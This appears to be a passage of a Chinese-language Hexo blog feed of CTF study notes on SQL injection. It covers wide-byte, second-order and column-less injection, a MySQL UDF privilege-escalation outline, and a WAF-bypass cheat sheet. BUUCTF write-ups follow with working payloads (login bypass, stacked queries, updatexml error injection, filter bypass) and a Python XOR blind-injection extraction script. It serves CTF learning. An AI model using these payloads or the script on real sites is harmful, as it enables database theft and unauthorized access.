数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为’，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p><a href="https://blog.csdn.net/kuiguowei/article/details/79045069">https://blog.csdn.net/kuiguowei/article/details/79045069</a></p><p>**原理：  **<br>后端语句对用户输入的数据进行严格的过滤<br>但对于从数据库中的搜索，提取的数据不进行过滤、判断<br>直接使用、代入数据库语句中使用<br>造成sql注入威胁  </p><p><strong>操作步骤：</strong><br>1.将恶意数据插入数据库<br>2.调用恶意数据/使恶意数据在sql语句中起到非预期作用<br>3.回显/根据回显数据调整恶意数据的编写  </p><p><strong>常见类型：</strong><br>注册-登录<br>添加某种数据类型-显示/展示详情    </p><p><strong>例：</strong><br><strong>[SWPU2019]Web1</strong>  </p><h2 id="mysql数据库对转义字符-的存储"><a href="#mysql数据库对转义字符-的存储" class="headerlink" title="mysql数据库对转义字符\的存储"></a>mysql数据库对转义字符\的存储</h2><p>后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义</p><p>经过函数转义后转义字符前+<br>但在数据库存储时存储原字符<br>（如用户输入#，经过函数处理的字符串-&gt;#,插入数据库中的数据仍为#）</p><p>mysql数据库对于\的存储自动-1<br>即：\-&gt;,-&gt;null</p><p><img src="/2021/07/24/sql-ways/escape-string.png">   </p><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><p><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><div class="hljs code-wrapper"><pre><code>//共有1,2,3三列数据//用1,2,3 代替列名输出select 1,2,3 union select * from table_name;//查询第三列的数据select group_concat(b) from(select 1,2,3 as b union select * from table_name)m;//或者不用别名select `3` from(select 1,2,3 union select * from table_name)m;</code></pre></div><p><img src="/2021/07/24/sql-ways/nocolumn-1.png"> </p><p><img src="/2021/07/24/sql-ways/nocolumn-2.png"> </p><p><strong>例：[SWPU2019]Web1</strong></p><hr><hr><hr><h1 id="mysql-写文件"><a href="#mysql-写文件" class="headerlink" title="mysql 写文件"></a>mysql 写文件</h1><div class="hljs code-wrapper"><pre><code>//将数据导出到&#39;&#39;文件中------需要一个登录服务器的账号select * from xxx_tableinto outfile &#39;&#39;;</code></pre></div><h1 id="水平-平行越权和垂直越权"><a href="#水平-平行越权和垂直越权" class="headerlink" title="水平/平行越权和垂直越权"></a>水平/平行越权和垂直越权</h1><p>平行越权 (访问控制攻击) ：同等级的用户之间的越权操作</p><p>垂直越权 (跨级别越权) ：低等级用户获取高等级用户的权限</p><h1 id="mysql-UDF-提权"><a href="#mysql-UDF-提权" class="headerlink" title="mysql UDF 提权"></a>mysql UDF 提权</h1><h2 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h2><p>user defined function  </p><p>用户自定义函数</p><p>用户可以添加自定义的新函数到 Mysql 中 </p><h2 id="UDF-在渗透中的作用"><a href="#UDF-在渗透中的作用" class="headerlink" title="UDF 在渗透中的作用"></a>UDF 在渗透中的作用</h2><p>拿到服务器的shell（权限低） –&gt; 服务器配置了mysql –&gt; 自定义的函数拥有管理员权限 –&gt; 管理员的权限</p><p>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1、mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；</p><p>2、CREATE权限、FILE权限（root用户默认拥有所有权限）</p><p>3、INSERT权限、UPDATE权限、DELETE权限</p><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><h3 id="1、查看可导出文件位置"><a href="#1、查看可导出文件位置" class="headerlink" title="1、查看可导出文件位置"></a>1、查看可导出文件位置</h3><h3 id="2、查看当前数据库用户权限"><a href="#2、查看当前数据库用户权限" class="headerlink" title="2、查看当前数据库用户权限"></a>2、查看当前数据库用户权限</h3><h3 id="3、确定mysql安装位置"><a href="#3、确定mysql安装位置" class="headerlink" title="3、确定mysql安装位置"></a>3、确定mysql安装位置</h3><h3 id="4、通过主机版本及架构确定mysql位数来选用udf文件"><a href="#4、通过主机版本及架构确定mysql位数来选用udf文件" class="headerlink" title="4、通过主机版本及架构确定mysql位数来选用udf文件"></a>4、通过主机版本及架构确定mysql位数来选用udf文件</h3><h3 id="5、查看数据库版本，判断udf文件写入位置"><a href="#5、查看数据库版本，判断udf文件写入位置" class="headerlink" title="5、查看数据库版本，判断udf文件写入位置"></a>5、查看数据库版本，判断udf文件写入位置</h3><h4 id="5-1-mysql大于5-1版本时"><a href="#5-1-mysql大于5-1版本时" class="headerlink" title="5.1 mysql大于5.1版本时"></a>5.1 mysql大于5.1版本时</h4><h5 id="5-1-1-查看-plugin-目录，存在-lib-plugin-目录且有webshell时，直接上传udf文件"><a href="#5-1-1-查看-plugin-目录，存在-lib-plugin-目录且有webshell时，直接上传udf文件" class="headerlink" title="5.1.1 查看 plugin 目录，存在 lib\plugin 目录且有webshell时，直接上传udf文件"></a>5.1.1 查看 plugin 目录，存在 lib\plugin 目录且有webshell时，直接上传udf文件</h5><h5 id="5-1-2-查看-plugin-目录，存在-lib-plugin-目录但没有webshell时，则需要以16进制编码写入udf文件"><a href="#5-1-2-查看-plugin-目录，存在-lib-plugin-目录但没有webshell时，则需要以16进制编码写入udf文件" class="headerlink" title="5.1.2 查看 plugin 目录，存在 lib\plugin 目录但没有webshell时，则需要以16进制编码写入udf文件"></a>5.1.2 查看 plugin 目录，存在 lib\plugin 目录但没有webshell时，则需要以16进制编码写入udf文件</h5><h5 id="5-1-3-查看-plugin-目录，不存在-lib-plugin-目录但有webshell，可使用webshell创建-lib-plugin目录"><a href="#5-1-3-查看-plugin-目录，不存在-lib-plugin-目录但有webshell，可使用webshell创建-lib-plugin目录" class="headerlink" title="5.1.3 查看 plugin 目录，不存在 lib\plugin 目录但有webshell，可使用webshell创建 lib\plugin目录"></a>5.1.3 查看 plugin 目录，不存在 lib\plugin 目录但有webshell，可使用webshell创建 lib\plugin目录</h5><h5 id="5-1-4-查看-plugin-目录，不存在-lib-plugin-目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了"><a href="#5-1-4-查看-plugin-目录，不存在-lib-plugin-目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了" class="headerlink" title="5.1.4 查看 plugin 目录，不存在 lib\plugin 目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了"></a>5.1.4 查看 plugin 目录，不存在 lib\plugin 目录也没有webshell，此时就要使用网传ADS文件流创建目录的方法了</h5><h4 id="5-2-mysql小于5-1版本时"><a href="#5-2-mysql小于5-1版本时" class="headerlink" title="5.2 mysql小于5.1版本时"></a>5.2 mysql小于5.1版本时</h4><h5 id="5-2-1-有webshell时，通过webshell上传udf文件"><a href="#5-2-1-有webshell时，通过webshell上传udf文件" class="headerlink" title="5.2.1 有webshell时，通过webshell上传udf文件"></a>5.2.1 有webshell时，通过webshell上传udf文件</h5><h5 id="5-2-2-无webshell时，使用dumpfile通过16进制数据流写入udf文件"><a href="#5-2-2-无webshell时，使用dumpfile通过16进制数据流写入udf文件" class="headerlink" title="5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件"></a>5.2.2 无webshell时，使用dumpfile通过16进制数据流写入udf文件</h5><h3 id="6、创建命令执行函数"><a href="#6、创建命令执行函数" class="headerlink" title="6、创建命令执行函数"></a>6、创建命令执行函数</h3><h3 id="7、命令执行"><a href="#7、命令执行" class="headerlink" title="7、命令执行"></a>7、命令执行</h3>]]></content>
    
    
    
    <tags>
      
      <tag>web sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql-waf-ways</title>
    <link href="/2021/07/23/sql-waf-ways/"/>
    <url>/2021/07/23/sql-waf-ways/</url>
    
    <content type="html"><![CDATA[<p>sql注入绕过waf相关方法/问题</p><span id="more"></span><h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><div class="hljs code-wrapper"><pre><code>1-等量替换  2-参数污染HPP  3-编码绕过  4-SQL特性   </code></pre></div><h2 id="空格（space）"><a href="#空格（space）" class="headerlink" title="空格（space）"></a>空格（space）</h2><p>%20 %09 %0a %0b %0c %0d %a0 %00 /**//*!*/ ()</p><h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><p>使用十六进制 ``</p><h2 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h2><p>#<br>%23<br>%00<br>–+<br>–<br>–a<br>||’1<br>//<br>/**/</p><h2 id="等价函数"><a href="#等价函数" class="headerlink" title="等价函数"></a>等价函数</h2><p>hex()、bin() ==&gt; ascii()</p><p>sleep() ==&gt;benchmark()</p><p>concat_ws()==&gt;group_concat()</p><p>mid()、substr() ==&gt; substring()</p><p>@@user ==&gt; user()</p><p>@@datadir ==&gt; datadir()</p><h1 id="or-information-schema的过滤绕过"><a href="#or-information-schema的过滤绕过" class="headerlink" title="or/information_schema的过滤绕过"></a>or/information_schema的过滤绕过</h1><p><a href="https://blog.csdn.net/m0_49835838/article/details/109159839">https://blog.csdn.net/m0_49835838/article/details/109159839</a></p><h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>该视图的作用简单来说就是用来对表自增ID的监控。<br><img src="/2021/07/23/sql-waf-ways/or-1.png">  </p><h2 id="sys-schema-table-statistics-with-buffer-sys-x-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer-sys-x-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer</h2><p>里面存储着所有数据库所有表的统计信息<br><img src="/2021/07/23/sql-waf-ways/or-2.png">  </p><h2 id="mysql默认存储引擎innoDB携带的表"><a href="#mysql默认存储引擎innoDB携带的表" class="headerlink" title="mysql默认存储引擎innoDB携带的表"></a>mysql默认存储引擎innoDB携带的表</h2><p>mysql.innodb_table_stats  </p><p>mysql.innodb_index_stats  </p><p>两表均有database_name和table_name字段，可以利用  </p><p><img src="/2021/07/23/sql-waf-ways/or-3.png"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU-sql</title>
    <link href="/2021/07/19/BUU-sql/"/>
    <url>/2021/07/19/BUU-sql/</url>
    
    <content type="html"><![CDATA[<p>BUU-sql题记</p><span id="more"></span><h1 id="1-EasySQL-极客大挑战-2019"><a href="#1-EasySQL-极客大挑战-2019" class="headerlink" title="1.EasySQL-[极客大挑战 2019]"></a>1.EasySQL-[极客大挑战 2019]</h1><p>万能密码……</p><div class="hljs code-wrapper"><pre><code>1&#39;or(1=1)#//get flag </code></pre></div><h1 id="2-堆叠注入-handler-强网杯-2019-随便注"><a href="#2-堆叠注入-handler-强网杯-2019-随便注" class="headerlink" title="2.堆叠注入+handler-[强网杯 2019]随便注"></a>2.堆叠注入+handler-[强网杯 2019]随便注</h1><p><img src="/2021/07/19/BUU-sql/1-1.png"></p><p>ban:  </p><p><img src="/2021/07/19/BUU-sql/1-2.png"></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句  </p><p>堆叠注入原理</p><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句</p><p><img src="/2021/07/19/BUU-sql/1-3.png"></p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p>handler 教程：<br><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><p>其作用类似于select</p><h5 id="handler用法："><a href="#handler用法：" class="headerlink" title="handler用法："></a>handler用法：</h5><p>打开句柄  </p><div class="hljs code-wrapper"><pre><code>handler handler_table open;</code></pre></div><p>查看数据  </p><div class="hljs code-wrapper"><pre><code>handler handler_table read first;handler handler_table read next;</code></pre></div><p> 前期准备 </p><p>查库  </p><div class="hljs code-wrapper"><pre><code>0&#39;or 1=1;show databases;#</code></pre></div><p>库：<br>ctftraining\information_schema\mysql\performance_schema\supersqli\test</p><p>查表  </p><div class="hljs code-wrapper"><pre><code>0&#39;or 1=1;show tables;#</code></pre></div><p>表：<br>1919810931114514\words</p><p>payload:  </p><div class="hljs code-wrapper"><pre><code>1&#39;or(1=1);handler`1919810931114514`open;handler`1919810931114514`read first;</code></pre></div><h1 id="3-猜测后端查询语句-SUCTF-2019-EasySQL"><a href="#3-猜测后端查询语句-SUCTF-2019-EasySQL" class="headerlink" title="3.猜测后端查询语句-[SUCTF 2019]EasySQL"></a>3.猜测后端查询语句-[SUCTF 2019]EasySQL</h1><p><img src="/2021/07/19/BUU-sql/2-1.png"></p><p>ban:<br>“/&amp;/union/and/or/sleep/where/from/like/prepare/if/handler/updatexml/extractvalue/insert/update<br>Nonono.  </p><p>@回显  :</p><p><img src="/2021/07/19/BUU-sql/2-2.png">这…不太会用    </p><p>非0数字 如下/数字0 无回显  </p><p><img src="/2021/07/19/BUU-sql/2-3.png">   </p><p>可用1;show databases#//1;show tables#回显得出库/表，get flag Nonono.      …………….</p><p><big>getgetget 大佬博客   !!!</big>  </p><p><img src="/2021/07/19/BUU-sql/2-4.png"></p><p>payload1:</p><div class="hljs code-wrapper"><pre><code> *,1select *,1||flag from Flag//即select *---select flag from Flag</code></pre></div><p>payload2:</p><div class="hljs code-wrapper"><pre><code>1;set sql_mode=pipes_as_concat;select 1select 1;set sql_mode=pipes_as_concat;select 1 ||flag from Flag;</code></pre></div><p><img src="/2021/07/19/BUU-sql/2-5.png">  </p><h2 id="pipes-as-concat-将‘-’-视为字符的操作符"><a href="#pipes-as-concat-将‘-’-视为字符的操作符" class="headerlink" title="pipes_as_concat 将‘ || ’ 视为字符的操作符"></a>pipes_as_concat 将‘ || ’ 视为字符的操作符</h2><p>将‘  ||  ’ 视为字符的操作符而非或运算符</p><div class="hljs code-wrapper"><pre><code>set sql_mode=pipes_as_concat;</code></pre></div><h2 id="select-1-from-table"><a href="#select-1-from-table" class="headerlink" title="select 1 from table"></a>select 1 from table</h2><p><a href="https://www.cnblogs.com/jiechn/p/3979261.html">https://www.cnblogs.com/jiechn/p/3979261.html</a></p><p>select任何一个常数都会在表中新建一列，然后查询出那一列的内容。</p><p>select 1 from Flag的结果就是一排1，这一排有几个数据取决于表的行数多少。</p><p><img src="/2021/07/19/BUU-sql/2-6.png"> </p><h1 id="4-基本的sql步骤-极客大挑战-2019-LoveSQL"><a href="#4-基本的sql步骤-极客大挑战-2019-LoveSQL" class="headerlink" title="4.基本的sql步骤-[极客大挑战 2019]LoveSQL"></a>4.基本的sql步骤-[极客大挑战 2019]LoveSQL</h1><p><img src="/2021/07/19/BUU-sql/3-1.png">   </p><p>查看源码，get  一个check.php<br>抓包，用一句话万能密码进行尝试</p><div class="hljs code-wrapper"><pre><code>/check.php?username=1&amp;password=1&#39;or(1=1)%23</code></pre></div><p>然后…就过了…  </p><p><img src="/2021/07/19/BUU-sql/3-2.png">  </p><p>尝试MD5解码失败…回到注入的思路上</p><p>寻找注入点：</p><div class="hljs code-wrapper"><pre><code>/check.php?username=1&amp;password=1&#39;union+select+1,2,3%23</code></pre></div><p>Get it</p><p><img src="/2021/07/19/BUU-sql/3-3.png"> </p><div class="hljs code-wrapper"><pre><code>//查库1&#39;union+select+1,group_concat(database()),3%23//库：geek//查表1&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;%23//表：geekuser,l0ve1ysq1//直接查表l0ve1ysq1//查列名1&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_name=&#39;l0ve1ysq1&#39;%23//列： id,username,password//查l0ve1ysq1-password的字段值//查字段值1&#39;union+select+1,group_concat(password),3+from+l0ve1ysq1%23//get flag</code></pre></div><p>查找时返回数据时+函数group_concat()~~~<br>(第一次没加，查geekuser表查半天…)</p><h1 id="5-replace-函数过滤-双写绕过-极客大挑战-2019-BabySQL"><a href="#5-replace-函数过滤-双写绕过-极客大挑战-2019-BabySQL" class="headerlink" title="5.replace()函数过滤+双写绕过-[极客大挑战 2019]BabySQL"></a>5.replace()函数过滤+双写绕过-[极客大挑战 2019]BabySQL</h1><p><img src="/2021/07/19/BUU-sql/4-1.png">   </p><p>继续用万能密码测试：</p><div class="hljs code-wrapper"><pre><code>/check.php?username=1&amp;password=1&#39;or(1=1)%23</code></pre></div><p><img src="/2021/07/19/BUU-sql/4-2.png"> </p><p>好像ban了or，用</p><div class="hljs code-wrapper"><pre><code>/check.php?username=1&amp;password=1&#39;or(1or=1)%23</code></pre></div><p><img src="/2021/07/19/BUU-sql/4-3.png"><br>（这不是同一张图:）<br>确定，同时确认过滤方式   </p><p>ban：or/and/select/union/where/from</p><p>先进去…</p><div class="hljs code-wrapper"><pre><code>1&#39;oorr(1=1)%231&#39;||(1=1)%23</code></pre></div><p>然后…</p><p><img src="/2021/07/19/BUU-sql/4-4.png"> </p><p>又长这样…       :） </p><p>so…  </p><div class="hljs code-wrapper"><pre><code>//注入点1&#39;uniunionon+selecselectt+1,2,3%23//库1&#39;uniunionon+selecselectt+1,group_concat(database()),3%23//get database ---geek//表1&#39;ununionion+seleselectct+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema=&#39;geek&#39;%23//get table ---b4bsql/geekuser//---&gt; b4bsql 列名1&#39;ununionion+seleselectct+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_name=&#39;b4bsql&#39;%23//---&gt; b4bsql get columns ---id,username,password//查找---&gt; b4bsql ---&gt; password1&#39;ununionion+seleselectct+1,group_concat(passwoorrd),3+frfromom+b4bsql%23//get flag</code></pre></div><h1 id="6-updatexml报错注入-反向读取sql结果-极客大挑战-2019-HardSQL"><a href="#6-updatexml报错注入-反向读取sql结果-极客大挑战-2019-HardSQL" class="headerlink" title="6.updatexml报错注入+反向读取sql结果-[极客大挑战 2019]HardSQL"></a>6.updatexml报错注入+反向读取sql结果-[极客大挑战 2019]HardSQL</h1><p><img src="/2021/07/19/BUU-sql/5-1.png"> </p><p>尝试万能密码…ban 了 =<br>改造一下  </p><div class="hljs code-wrapper"><pre><code>username=1&amp;password=1&#39;or(1)%23</code></pre></div><p>login success</p><p><img src="/2021/07/19/BUU-sql/5-2.png"> </p><p>测试过滤字符，构造注入语句—</p><p>ban<br>=/!/&lt;&gt;/+/*/union/space/%00/%09/%20/%0a/%0c/sleep/if/substring</p><p>ban 了 空格的使用 ，可用()绕过，substring 用left()、right()读取</p><p>发现报错注入可用：</p><div class="hljs code-wrapper"><pre><code>//库1&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23//get database ---geek//表1&#39;or(updatexml(1,concat(0x7e,(select`table_name`from(information_schema.tables)where(`table_schema`like&#39;geek&#39;)),0x7e),1))%23//get table  ---H4rDsq1//列名1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(`table_name`like&#39;H4rDsq1&#39;))),1))%23//---&gt;  id,username,password//字段1&#39;or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`),0x7e),1))%23//cat 前半部分flag1&#39;or(updatexml(1,concat(0x7e,right((select`password`from`H4rDsq1`),30),0x7e),1))%23//cat 后半部分flag//---&gt;cat flag</code></pre></div><h2 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h2><p>—&gt;sql-ways</p><h2 id="sql反向读取输出数据"><a href="#sql反向读取输出数据" class="headerlink" title="sql反向读取输出数据"></a>sql反向读取输出数据</h2><p><img src="/2021/07/19/BUU-sql/5-3.png"> </p><h1 id="7-脑洞题-绕过md5比较-union-select构造数据-GXYCTF2019-BabySQli"><a href="#7-脑洞题-绕过md5比较-union-select构造数据-GXYCTF2019-BabySQli" class="headerlink" title="7.脑洞题-绕过md5比较+union select构造数据-[GXYCTF2019]BabySQli"></a>7.脑洞题-绕过md5比较+union select构造数据-[GXYCTF2019]BabySQli</h1><p><img src="/2021/07/19/BUU-sql/6-1.png"><br>嗯…很简洁的界面</p><p>抓包，正常测试注入点</p><div class="hljs code-wrapper"><pre><code>name=1&amp;pw=1-----wrong username=admin&amp;pw=1-----wrong passname=admin&amp;pw=1&#39;or(1=1)#-----wrong passname=admin&#39;or(1=1)#&amp;pw=1-----do not hack me!</code></pre></div><p>ok，在pw中的输入全是wrong pass，name值为admin才会验证pw并且在name中存在过滤<br>所以在name的返回值有两个，T–wrong pass ，F–wrong true  </p><p>验证想法…</p><div class="hljs code-wrapper"><pre><code>name=admin&#39;and%201#&amp;pw=1-----T-&gt;wrong passname=admin&#39;and%200#&amp;pw=1-----F-&gt;wrong user</code></pre></div><p>尝试盲注2021/7/26 15:05:07 ，构造payload，写脚本</p><p>ban ：<br>=/(/)/or/</p><p>尝试构造payload：尝试绕过过滤，编码绕过…无效…重审源码…</p><p><strong>55555（翻大佬wp）</strong><br><a href="https://blog.csdn.net/qq_45521281/article/details/107167452">https://blog.csdn.net/qq_45521281/article/details/107167452</a></p><p>检查源码，抓到search.php，注释中的奇怪字符</p><p>先base32后64 解码</p><p><img src="/2021/07/19/BUU-sql/6-2.png"></p><div class="hljs code-wrapper"><pre><code>name=1&#39;union select 1,&#39;1&#39;,3#&amp;pw=1-----wrong username=1&#39;union select &#39;admin&#39;,2,3#&amp;pw=1-----wrong username=1&#39;union select 1,&#39;admin&#39;,3#&amp;pw=1-----wrong passname=1&#39;union select 1,2,&#39;admin&#39;#&amp;pw=1-----wrong user</code></pre></div><p>盲猜，id，username，password</p><p><img src="/2021/07/19/BUU-sql/6-3.png"><br>（偷图大佬WHOAMIAnony）狗头）</p><h2 id="union-select-构造数据"><a href="#union-select-构造数据" class="headerlink" title="union select 构造数据"></a>union select 构造数据</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/107167452">https://blog.csdn.net/qq_45521281/article/details/107167452</a></p><p>简单解释就是在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。<br>仅在本次查询中起作用(非固定数据)</p><p><img src="/2021/07/19/BUU-sql/6-4.png"></p><p>即用构造的数据绕过md5检测</p><p>payload：</p><div class="hljs code-wrapper"><pre><code>name=1&#39;union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code></pre></div><p><strong>总结一下：</strong><br>1.仔细检查源码<br>2.大胆猜测后端语句（还是题做的少…）<br>3.知识面太窄（（：）</p><h1 id="8-handler-GYCTF2020-Blacklist"><a href="#8-handler-GYCTF2020-Blacklist" class="headerlink" title="8.handler-[GYCTF2020]Blacklist"></a>8.handler-[GYCTF2020]Blacklist</h1><p>与’[强网杯 2019]随便注’ 近似  </p><p><img src="/2021/07/19/BUU-sql/7.png"></p><p><img src="/2021/07/19/BUU-sql/7-2.png"></p><div class="hljs code-wrapper"><pre><code>//查库/?inject=1&#39;;show%20databases;//好像没什么用...//查表/?inject=1&#39;;show%20tables;//FlagHere---words</code></pre></div><p>paylaod:</p><div class="hljs code-wrapper"><pre><code>1&#39;;handler`FlagHere`open;handler`FlagHere`read%20first;//get flag</code></pre></div><p>用的是handler代替select读取数据，可能是非预期解法…baidu一下。是预期解 :)</p><h2 id="desc-妙用"><a href="#desc-妙用" class="headerlink" title="desc 妙用"></a>desc 妙用</h2><p>desc+表名<br>降序输出该表内的数据表结构</p><div class="hljs code-wrapper"><pre><code>1&#39;;desc`FlagHere`;%23</code></pre></div><p><img src="/2021/07/19/BUU-sql/7-3.png"></p><h1 id="9-二次注入-无列名注入-SWPU2019-Web1"><a href="#9-二次注入-无列名注入-SWPU2019-Web1" class="headerlink" title="9.二次注入+无列名注入-[SWPU2019]Web1"></a>9.二次注入+无列名注入-[SWPU2019]Web1</h1><p><strong>界面：</strong>注册、登录、广告管理主界面、申请添加发布广告、查看广告详情</p><p>二次注入点：申请发布广告<br>二次注入回显：查看广告详情</p><p>在发布界面尝试测试注入点    (1’)<br>在详情界面存在报错，存在二次注入点  </p><p>尝试构造payload：</p><div class="hljs code-wrapper"><pre><code>1&#39;union/**/select/**/1,2,3&#39;</code></pre></div><p><img src="/2021/07/19/BUU-sql/8-1.png"></p><div class="hljs code-wrapper"><pre><code>//确定列数1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre></div><p><img src="/2021/07/19/BUU-sql/8-2.png"></p><div class="hljs code-wrapper"><pre><code>1&#39;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;//get 库 ---&gt; web1//ban 了or 无法获取表 观摩大佬wp...//发现是buu环境问题......//直接get 表 ---&gt; users//无列名注入1&#39;union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/`users`)m),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;//get flag</code></pre></div><p>参考文献：<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">https://www.cnblogs.com/wangtanzhi/p/12241499.html</a></p><h1 id="10-异或盲注-极客大挑战-2019-FinalSQL"><a href="#10-异或盲注-极客大挑战-2019-FinalSQL" class="headerlink" title="10.异或盲注-[极客大挑战 2019]FinalSQL"></a>10.异或盲注-[极客大挑战 2019]FinalSQL</h1><p><img src="/2021/07/19/BUU-sql/9-1.png"></p><p>尝试用户登录，发现差不多都ban了…注入点应该不在这</p><p>5个界面get函数/?id=x</p><p>提示SQL盲注，先测试过滤</p><p>ban：<br>*/+/@/&amp;/%/and/union/–+/by/limit/like/char/if/mid/handler/insert</p><p>发现异或符号^没ban</p><p>^_^</p><h2 id="回顾异或注入"><a href="#回顾异或注入" class="headerlink" title="回顾异或注入"></a>回顾异或注入</h2><div class="hljs code-wrapper"><pre><code>0^0=01^1=00^1=11^0=1//相同为0，不同为1</code></pre></div><p>关键是找到0/1的区分，像该题目</p><p>测试输出</p><p>1^0—&gt;（id=1对应的界面）<br><img src="/2021/07/19/BUU-sql/9-3.png"></p><p>1^1—&gt;<br><img src="/2021/07/19/BUU-sql/9-2.png"></p><p>所以构造payload–1^(语句)<br>通过返回界面的不同来判断该语句的正误</p><p>构造payload：</p><div class="hljs code-wrapper"><pre><code>//库1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)//表1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),&#123;&#125;,1))=&#123;&#125;)//列1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),&#123;&#125;,1))=&#123;&#125;)//字段1^(ascii(substr((select(group_concat(`password`))from`F1naI1y`),&#123;&#125;,1))=&#123;&#125;)</code></pre></div><p>直接贴上脚本：</p><div class="hljs code-wrapper"><pre><code>import requestsimport timeurl = &#39;url/search.php?id=&#39;## 爆数据库名     ### geekpayload1 = &quot;1^(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆表名     ### F1naI1y,Flaaaaagpayload2 = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;geek&#39;)),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆列名     ### F1naI1y--id,username,password     ### Flaaaaag--id,fl4gawslpayload3 =&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),&#123;&#125;,1))=&#123;&#125;)&quot;## 爆字段     ### fl4gawsl---NO! Not this! Click others~~~,yingyingying~ Not this as well~~,Ohhh You find the flag read on!&lt;br/&gt;Ohhh You find the flag read on!&lt;br/&gt;...              ### password---flagpayload4 = &quot;1^(ascii(substr((select(group_concat(`password`))from`F1naI1y`),&#123;&#125;,1))=&#123;&#125;)&quot;catcat = &#39;&#39;flag = &#39;&#39;for i in range(0, 10000):    print(&#39;第&#39;+str(i)+&#39;位&#39;)    for j in range(127):        time.sleep(0.05)                                  ###buu平台存在Too many requests...        catcat = url+payload4.format(i, j)        exp = requests.get(url=catcat)        # print(exp.text)        if &quot;ERROR&quot; in exp.text:            flag = flag + chr(j)            print(&#39;--------------------------------------------&#123;&#125;&#39;.format(j))            print(&#39;*****************&#39;+flag)            breakprint(&#39;flag is &#39;+flag)</code></pre></div><p><img src="/2021/07/19/BUU-sql/9-4.png"></p><p>在错误字段Flaaaaag-fl4gawsl中耗费了太多时间…</p><h1 id="11-异或盲注-WUSTCTF2020-颜值成绩查询"><a href="#11-异或盲注-WUSTCTF2020-颜值成绩查询" class="headerlink" 